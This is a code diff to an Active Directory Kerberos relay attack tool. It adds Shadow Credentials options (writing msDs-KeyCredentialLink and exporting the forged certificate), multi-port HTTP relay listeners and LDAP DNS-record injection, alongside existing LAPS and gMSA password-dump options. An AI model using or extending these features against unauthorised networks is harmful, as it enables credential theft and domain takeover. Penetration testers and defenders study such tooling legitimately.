@@ -41,13 +41,14 @@ import argparse
 import sys
 import binascii
 import logging
+from time import sleep
 
 from impacket.examples import logger
 from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
-
 from lib.servers import SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer
 from lib.utils.config import KrbRelayxConfig
+from impacket.examples.ntlmrelayx.utils.config import parse_listening_ports
 
 RELAY_SERVERS = ( SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer )
 
@@ -78,6 +79,8 @@ def main():
             c.setAttacks(PROTOCOL_ATTACKS)
             c.setLootdir(options.lootdir)
             c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid)
+            c.setIsShadowCredentialsAttack(options.shadow_credentials)
+            c.setShadowCredentialsOptions(options.shadow_target, options.pfx_password, options.export_type, options.cert_outfile_path)
             c.setIPv6(options.ipv6)
             c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
             c.setSMB2Support(not options.no_smb2support)
@@ -97,9 +100,13 @@ def main():
                 c.setMode('REDIRECT')
                 c.setRedirectHost(options.r)
 
-            s = server(c)
-            s.start()
-            threads.add(s)
+            if server is HTTPKrbRelayServer:
+                for port in options.http_port:
+                    c.setListeningPort(port)
+                    s = server(c)
+                    s.start()
+                    threads.add(s)
+                    sleep(0.1)
         return c
 
     # Init the example's logger theme
@@ -124,6 +131,8 @@ def main():
     # Interface address specification
     parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
                   'bind SMB and HTTP servers',default='')
+    parser.add_argument('--no-http-server', action='store_true', help='Disables the HTTP server')
+    parser.add_argument('--http-port', help='Port(s) to listen on hTTP server. Can specify multiple ports by separating them with `,`, and ranges with `-`. Ex: `80,800-8010`', default="80")
 
     parser.add_argument('-r', action='store', metavar='SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
     parser.add_argument('-l', '--lootdir', action='store', type=str, required=False, metavar='LOOTDIR', default='.', help='Loot '
@@ -178,6 +187,7 @@ def main():
     ldapoptions.add_argument('--dump-laps', action='store_true', required=False, help='Attempt to dump any LAPS passwords readable by the user')
     ldapoptions.add_argument('--dump-gmsa', action='store_true', required=False, help='Attempt to dump any gMSA passwords readable by the user')
     ldapoptions.add_argument('--dump-adcs', action='store_true', required=False, help='Attempt to dump ADCS enrollment services and certificate templates info')
+    ldapoptions.add_argument('--add-dns-record', nargs=2, action='store', metavar=('NAME', 'IPADDR'), required=False, help='Add the <NAME> record to the DNS via LDAP pointing to <IPADDR>')
 
     # AD CS options
     adcsoptions = parser.add_argument_group("AD CS attack options")
@@ -185,6 +195,14 @@ def main():
     adcsoptions.add_argument('--template', action='store', metavar="TEMPLATE", required=False, help='AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`')
     adcsoptions.add_argument('--altname', action='store', metavar="ALTNAME", required=False, help='Subject Alternative Name to use when performing ESC1 or ESC6 attacks.')
     adcsoptions.add_argument('-v', "--victim", action='store', metavar = 'TARGET', help='Victim username or computername$, to request the correct certificate name.')
+
+    # Shadow Credentials attack options
+    shadowcredentials = parser.add_argument_group("Shadow Credentials attack options")
+    shadowcredentials.add_argument('--shadow-credentials', action='store_true', required=False, help='Enable Shadow Credentials replay attack (msDs-KeyCredentialLink manipulation for PKINIT pre-authentication)')
+    shadowcredentials.add_argument('--shadow-target', action='store', required=False, help='Target account (user or computer$) to populate the msDs-KeyCredentialLink from')
+    shadowcredentials.add_argument('--pfx-password', action='store', required=False, help='Password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)')
+    shadowcredentials.add_argument('--export-type', action='store', required=False, choices=["PEM", 'PFX'], type=lambda choice: choice.upper(), default="PFX", help='Choose to export cert+private key in PEM of PFX (i.e. #PKCS12) (default: PFX)')
+    shadowcredentials.add_argument('--cert-outfile-path', action='store', required=False, help='Filename to store the generated self-signed PEM or PFX certificate and key')
 
     try:
         options = parser.parse_args()
@@ -202,6 +220,11 @@ def main():
     # Let's register the protocol clients we have
     # ToDo: Do this better somehow
     from lib.clients import PROTOCOL_CLIENTS
+
+    if options.add_dns_record:
+        dns_name = options.add_dns_record[0].lower()
+        if dns_name == 'wpad' or dns_name == '*':
+            logging.warning('You are asking to add a `wpad` or a wildcard DNS name. This can cause disruption in larger networks (using multiple DNS subdomains) or if workstations already use a proxy config.')
 
 
     if options.codec is not None:
@@ -224,6 +247,16 @@ def main():
             targetSystem = None
             mode = 'EXPORT'
 
+    if not options.no_http_server:
+        try:
+            options.http_port = parse_listening_ports(options.http_port)
+        except ValueError:
+            logging.error("Incorrect specification of port range for HTTP server")
+            sys.exit(1)
+
+        if options.r is not None:
+            logging.info("Running HTTP server in redirect mode")
+
     if not options.krbpass and not options.krbhexpass and not options.hashes and not options.aesKey:
         logging.info("Running in kerberos relay mode because no credentials were specified.")
         if mode == 'EXPORT':
@@ -232,9 +265,6 @@ def main():
         mode = 'RELAY'
     else:
         logging.info("Running in unconstrained delegation abuse mode using the specified credentials.")
-
-    if options.r is not None:
-        logging.info("Running HTTP server in redirect mode")
 
     if targetSystem is not None and options.w:
         watchthread = TargetsFileWatcher(targetSystem)
